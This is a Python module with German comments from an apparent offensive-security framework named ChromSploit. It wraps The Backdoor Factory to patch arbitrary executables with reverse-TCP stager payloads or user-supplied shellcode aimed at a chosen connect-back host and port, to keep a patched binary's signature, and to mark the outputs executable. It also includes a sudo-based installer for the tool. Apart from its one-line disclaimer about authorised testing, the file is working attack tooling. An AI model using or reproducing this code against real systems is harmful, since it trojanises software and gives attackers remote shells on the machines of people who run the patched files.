#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
Backdoor Factory Integration
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import shutil
import subprocess
import tempfile
from typing import Dict, List, Any, Optional, Tuple, Union

from core.colors import Colors
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils

class BackdoorFactoryIntegration:
    """
    Integration der Backdoor Factory in ChromSploit
    """
    
    def __init__(self, logger: Optional[Logger] = None):
        """
        Initialisiert die Backdoor Factory-Integration
        
        Args:
            logger (Logger, optional): Logger-Instanz
        """
        self.logger = logger
        self.bdf_path = "/opt/the-backdoor-factory"
        self.bdf_script = os.path.join(self.bdf_path, "backdoor.py")
    
    def log(self, level: str, message: str) -> None:
        """
        Loggt eine Nachricht
        
        Args:
            level (str): Log-Level
            message (str): Nachricht
        """
        if self.logger:
            if level == "info":
                self.logger.info(message)
            elif level == "warning":
                self.logger.warning(message)
            elif level == "error":
                self.logger.error(message)
            elif level == "debug":
                self.logger.debug(message)
        else:
            print(f"{Colors.BLUE}[*] {message}{Colors.RESET}" if level == "info" else
                  f"{Colors.YELLOW}[!] {message}{Colors.RESET}" if level == "warning" else
                  f"{Colors.RED}[-] {message}{Colors.RESET}" if level == "error" else
                  f"{Colors.MAGENTA}[D] {message}{Colors.RESET}")
    
    def is_available(self) -> bool:
        """
        Überprüft, ob die Backdoor Factory verfügbar ist
        
        Returns:
            bool: True, wenn die Backdoor Factory verfügbar ist, sonst False
        """
        return os.path.exists(self.bdf_script)
    
    def get_version(self) -> str:
        """
        Gibt die Backdoor Factory-Version zurück
        
        Returns:
            str: Die Backdoor Factory-Version oder "Unbekannt" bei Fehler
        """
        try:
            if os.path.exists(self.bdf_script):
                result = subprocess.run(["python3", self.bdf_script, "-h"], 
                                     capture_output=True, text=True, timeout=10)
                
                # Version aus der Hilfeausgabe extrahieren
                for line in result.stdout.split('\n'):
                    if "Version:" in line:
                        return line.strip()
                
                return "Verfügbar, Version unbekannt"
            return "Nicht verfügbar"
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der Backdoor Factory-Version: {str(e)}")
            return "Unbekannt"
    
    def install(self) -> bool:
        """
        Installiert die Backdoor Factory, falls sie nicht verfügbar ist
        
        Returns:
            bool: True bei erfolgreicher Installation, sonst False
        """
        if self.is_available():
            self.log("info", "Backdoor Factory ist bereits installiert")
            return True
        
        self.log("info", "Installiere Backdoor Factory...")
        
        try:
            # Abhängigkeiten installieren
            self.log("info", "Installiere Abhängigkeiten...")
            deps_cmd = "sudo apt-get update && sudo apt-get install -y git python3 python3-pip libcapstone-dev"
            subprocess.run(deps_cmd, shell=True, check=True)
            
            # Backdoor Factory klonen
            self.log("info", "Klone Backdoor Factory-Repository...")
            clone_cmd = f"git clone https://github.com/secretsquirrel/the-backdoor-factory.git {self.bdf_path}"
            subprocess.run(clone_cmd, shell=True, check=True)
            
            # Python-Abhängigkeiten installieren
            self.log("info", "Installiere Python-Abhängigkeiten...")
            os.chdir(self.bdf_path)
            pip_cmd = "pip3 install -r requirements.txt"
            subprocess.run(pip_cmd, shell=True, check=True)
            
            # Überprüfen, ob die Installation erfolgreich war
            if self.is_available():
                self.log("info", "Backdoor Factory wurde erfolgreich installiert")
                return True
            else:
                self.log("error", "Backdoor Factory-Installation fehlgeschlagen")
                return False
        except Exception as e:
            self.log("error", f"Fehler bei der Backdoor Factory-Installation: {str(e)}")
            return False
    
    def inject_backdoor(self, 
                       binary_file: str, 
                       output_file: Optional[str] = None,
                       payload: str = "iat_reverse_tcp_stager_threaded",
                       host: str = "127.0.0.1",
                       port: int = 4444,
                       cave_miner: bool = True,
                       patch_method: str = "manual") -> Optional[str]:
        """
        Injiziert einen Backdoor in eine Binärdatei
        
        Args:
            binary_file (str): Pfad zur Binärdatei
            output_file (str, optional): Pfad zur Ausgabedatei
            payload (str, optional): Payload-Typ
            host (str, optional): Host für Reverse-Verbindung
            port (int, optional): Port für Reverse-Verbindung
            cave_miner (bool, optional): Ob Code-Caves automatisch gefunden werden sollen
            patch_method (str, optional): Patch-Methode (manual, automatic, replace)
            
        Returns:
            str: Pfad zur modifizierten Binärdatei oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Backdoor Factory ist nicht verfügbar")
            return None
        
        if not os.path.exists(binary_file):
            self.log("error", f"Binärdatei existiert nicht: {binary_file}")
            return None
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "backdoor_factory")
            PathUtils.ensure_dir_exists(output_dir)
            
            base_name = os.path.basename(binary_file)
            name, ext = os.path.splitext(base_name)
            
            output_file = os.path.join(output_dir, f"{name}_backdoored{ext}")
        
        self.log("info", f"Injiziere Backdoor in {binary_file}...")
        
        try:
            # Befehl zum Injizieren des Backdoors erstellen
            cmd = ["python3", self.bdf_script, 
                  "-f", binary_file, 
                  "-o", output_file,
                  "-H", host,
                  "-P", str(port),
                  "-s", payload]
            
            # Cave-Miner-Option hinzufügen
            if cave_miner:
                cmd.extend(["-m"])
            
            # Patch-Methode hinzufügen
            if patch_method == "automatic":
                cmd.extend(["-a"])
            elif patch_method == "replace":
                cmd.extend(["-r"])
            
            # Backdoor injizieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0 and os.path.exists(output_file):
                self.log("info", f"Backdoor erfolgreich injiziert: {output_file}")
                
                # Ausführungsrechte setzen
                os.chmod(output_file, 0o755)
                
                return output_file
            else:
                self.log("error", f"Fehler beim Injizieren des Backdoors: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Injizieren des Backdoors: {str(e)}")
            return None
    
    def inject_shellcode(self, 
                        binary_file: str, 
                        shellcode_file: str,
                        output_file: Optional[str] = None,
                        cave_miner: bool = True,
                        patch_method: str = "manual") -> Optional[str]:
        """
        Injiziert benutzerdefinierten Shellcode in eine Binärdatei
        
        Args:
            binary_file (str): Pfad zur Binärdatei
            shellcode_file (str): Pfad zur Shellcode-Datei
            output_file (str, optional): Pfad zur Ausgabedatei
            cave_miner (bool, optional): Ob Code-Caves automatisch gefunden werden sollen
            patch_method (str, optional): Patch-Methode (manual, automatic, replace)
            
        Returns:
            str: Pfad zur modifizierten Binärdatei oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Backdoor Factory ist nicht verfügbar")
            return None
        
        if not os.path.exists(binary_file):
            self.log("error", f"Binärdatei existiert nicht: {binary_file}")
            return None
        
        if not os.path.exists(shellcode_file):
            self.log("error", f"Shellcode-Datei existiert nicht: {shellcode_file}")
            return None
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "backdoor_factory")
            PathUtils.ensure_dir_exists(output_dir)
            
            base_name = os.path.basename(binary_file)
            name, ext = os.path.splitext(base_name)
            
            output_file = os.path.join(output_dir, f"{name}_shellcode{ext}")
        
        self.log("info", f"Injiziere benutzerdefinierten Shellcode in {binary_file}...")
        
        try:
            # Befehl zum Injizieren des Shellcodes erstellen
            cmd = ["python3", self.bdf_script, 
                  "-f", binary_file, 
                  "-o", output_file,
                  "-u", shellcode_file]
            
            # Cave-Miner-Option hinzufügen
            if cave_miner:
                cmd.extend(["-m"])
            
            # Patch-Methode hinzufügen
            if patch_method == "automatic":
                cmd.extend(["-a"])
            elif patch_method == "replace":
                cmd.extend(["-r"])
            
            # Shellcode injizieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0 and os.path.exists(output_file):
                self.log("info", f"Shellcode erfolgreich injiziert: {output_file}")
                
                # Ausführungsrechte setzen
                os.chmod(output_file, 0o755)
                
                return output_file
            else:
                self.log("error", f"Fehler beim Injizieren des Shellcodes: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Injizieren des Shellcodes: {str(e)}")
            return None
    
    def analyze_binary(self, binary_file: str) -> Optional[Dict[str, Any]]:
        """
        Analysiert eine Binärdatei auf Code-Caves und andere Eigenschaften
        
        Args:
            binary_file (str): Pfad zur Binärdatei
            
        Returns:
            dict: Analyseergebnisse oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Backdoor Factory ist nicht verfügbar")
            return None
        
        if not os.path.exists(binary_file):
            self.log("error", f"Binärdatei existiert nicht: {binary_file}")
            return None
        
        self.log("info", f"Analysiere Binärdatei: {binary_file}...")
        
        try:
            # Befehl zur Analyse der Binärdatei erstellen
            cmd = ["python3", self.bdf_script, 
                  "-f", binary_file, 
                  "-S"]
            
            # Binärdatei analysieren
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                self.log("info", "Binärdatei erfolgreich analysiert")
                
                # Analyseergebnisse parsen
                analysis = {
                    "file_type": "",
                    "architecture": "",
                    "code_caves": [],
                    "sections": [],
                    "entry_point": "",
                    "raw_output": result.stdout
                }
                
                # Dateiformat und Architektur extrahieren
                for line in result.stdout.split('\n'):
                    if "FILE_TYPE:" in line:
                        analysis["file_type"] = line.split("FILE_TYPE:")[1].strip()
                    elif "ARCH:" in line:
                        analysis["architecture"] = line.split("ARCH:")[1].strip()
                    elif "Entry Point:" in line:
                        analysis["entry_point"] = line.split("Entry Point:")[1].strip()
                    elif "CAVE:" in line:
                        cave_info = line.split("CAVE:")[1].strip()
                        analysis["code_caves"].append(cave_info)
                    elif "SECTION:" in line:
                        section_info = line.split("SECTION:")[1].strip()
                        analysis["sections"].append(section_info)
                
                return analysis
            else:
                self.log("error", f"Fehler bei der Analyse der Binärdatei: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler bei der Analyse der Binärdatei: {str(e)}")
            return None
    
    def get_available_payloads(self) -> List[str]:
        """
        Gibt alle verfügbaren Payloads zurück
        
        Returns:
            list: Liste der verfügbaren Payloads
        """
        if not self.is_available():
            self.log("error", "Backdoor Factory ist nicht verfügbar")
            return []
        
        try:
            # Befehl zum Abrufen der verfügbaren Payloads erstellen
            cmd = ["python3", self.bdf_script, "-l"]
            
            # Payloads abrufen
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                payloads = []
                
                # Payloads parsen
                for line in result.stdout.split('\n'):
                    if line.strip() and "Usage:" not in line and "optional arguments:" not in line:
                        if ":" in line and "Available payloads" not in line:
                            payload = line.split(":")[0].strip()
                            payloads.append(payload)
                
                return payloads
            else:
                self.log("error", f"Fehler beim Abrufen der verfügbaren Payloads: {result.stderr}")
                return []
        except Exception as e:
            self.log("error", f"Fehler beim Abrufen der verfügbaren Payloads: {str(e)}")
            return []
    
    def preserve_signature(self, 
                          binary_file: str, 
                          output_file: Optional[str] = None) -> Optional[str]:
        """
        Erhält die Signatur einer Binärdatei beim Injizieren eines Backdoors
        
        Args:
            binary_file (str): Pfad zur Binärdatei
            output_file (str, optional): Pfad zur Ausgabedatei
            
        Returns:
            str: Pfad zur modifizierten Binärdatei oder None bei Fehler
        """
        if not self.is_available():
            self.log("error", "Backdoor Factory ist nicht verfügbar")
            return None
        
        if not os.path.exists(binary_file):
            self.log("error", f"Binärdatei existiert nicht: {binary_file}")
            return None
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "backdoor_factory")
            PathUtils.ensure_dir_exists(output_dir)
            
            base_name = os.path.basename(binary_file)
            name, ext = os.path.splitext(base_name)
            
            output_file = os.path.join(output_dir, f"{name}_signed{ext}")
        
        self.log("info", f"Erhalte Signatur von {binary_file}...")
        
        try:
            # Befehl zum Erhalten der Signatur erstellen
            cmd = ["python3", self.bdf_script, 
                  "-f", binary_file, 
                  "-o", output_file,
                  "-p"]
            
            # Signatur erhalten
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 and os.path.exists(output_file):
                self.log("info", f"Signatur erfolgreich erhalten: {output_file}")
                
                # Ausführungsrechte setzen
                os.chmod(output_file, 0o755)
                
                return output_file
            else:
                self.log("error", f"Fehler beim Erhalten der Signatur: {result.stderr}")
                return None
        except Exception as e:
            self.log("error", f"Fehler beim Erhalten der Signatur: {str(e)}")
            return None
